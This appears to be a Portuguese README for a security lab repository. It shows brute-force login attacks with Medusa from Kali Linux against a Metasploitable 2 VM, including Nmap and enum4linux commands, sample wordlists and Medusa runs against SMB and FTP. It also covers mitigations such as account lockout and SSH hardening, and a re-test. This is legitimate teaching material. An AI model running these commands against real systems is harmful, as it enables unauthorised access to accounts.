# 🧠 Laboratório de Ataques BRUTEFORCE com Medusa

## 📌 Visão Geral

Este projeto demonstra, em um ambiente controlado, a realização de **ataques de força bruta** utilizando a ferramenta **Medusa** no Kali Linux e a implementação de **medidas de mitigação baseadas em controle de acesso**.

O objetivo é compreender como ataques de autenticação ocorrem e como podem ser prevenidos através de boas práticas de segurança.

---

## 🎯 Objetivos

* Simular ataques de força bruta
* Identificar vulnerabilidades de autenticação
* Explorar serviços expostos
* Demonstrar o impacto de configurações inseguras
* Aplicar medidas de mitigação
* Validar as defesas implementadas

---

## 🛠 Ferramentas Utilizadas

* Kali Linux
* Metasploitable 2
* Medusa
* Nmap
* Enum4linux
* SMB / FTP / SSH
* Oracle VirtualBox

---

## 🧱 Estrutura do Repositório

```
lab-bruteforce-medusa
│
├── README.md
├── wordlists/
│   ├── usuarios.txt
│   └── senhas.txt
│
├── evidencias/
│   ├── reconhecimento/
│   ├── enumeracao/
│   ├── ataques/
│   └── mitigacoes/
│
└── images/
    ├── arquitetura.png
    ├── ataque_medusa.png
    └── resultado.png
```

---

## 🔧 Configuração do Ambiente

O laboratório utiliza duas máquinas virtuais:

* **Kali Linux** (máquina atacante)
* **Metasploitable 2** (máquina vulnerável)

As máquinas foram configuradas em **modo Host-Only** para comunicação interna.

Teste de conectividade:

```
ping IP_DO_ALVO
```

---

## 🔍 Reconhecimento com Nmap

Identificação de serviços expostos:

```
nmap -sV -p 21,22,80,139,445 IP_DO_ALVO
```

Serviços encontrados:

* FTP
* SSH
* SMB
* HTTP

---

## 🔎 Enumeração

Coleta de usuários do sistema:

```
enum4linux -a IP_DO_ALVO
```

---

## 🧾 Criação de Wordlists

```
echo -e "msfadmin\nuser\nservice" > usuarios.txt
echo -e "123456\npassword\nmsfadmin\nadmin\nWelcome123" > senhas.txt
```

---

## 💣 Ataque de Força Bruta com Medusa

### Ataque SMB

```
medusa -h IP_DO_ALVO -U usuarios.txt -P senhas.txt -M smbnt
```

### Ataque FTP

```
medusa -h IP_DO_ALVO -U usuarios.txt -P senhas.txt -M ftp
```

---

## 📊 Resultados

Durante os testes foi possível:

* Encontrar credenciais válidas
* Acessar serviços autenticados
* Demonstrar vulnerabilidades de autenticação

---

## 🛡 Medidas de Mitigação

### Política de Senhas

* Mínimo de 12 caracteres
* Combinação de letras, números e símbolos

### Bloqueio por Tentativas

Configuração no PAM:

```
auth required pam_tally2.so deny=5 unlock_time=300
```

### Hardening de SSH

Configuração no arquivo:

```
/etc/ssh/sshd_config
```

Parâmetros aplicados:

```
PermitRootLogin no
PasswordAuthentication no
Port 2222
```

Aplicação das alterações:

```
sudo service ssh restart
```

---

## 🚨 Validação das Defesas

Após aplicar as mitigações, os testes de força bruta foram executados novamente:

```
medusa -h IP_DO_ALVO -U usuarios.txt -P senhas.txt -M smbnt
```

Resultado:

* Nenhuma credencial encontrada
* Ataques bloqueados

---

## 🚀 Conclusão

O laboratório demonstra como **credenciais fracas e configurações inseguras** podem comprometer um sistema.

Também evidencia que **boas práticas de segurança e controle de acesso** são fundamentais para reduzir riscos e impedir ataques de força bruta.
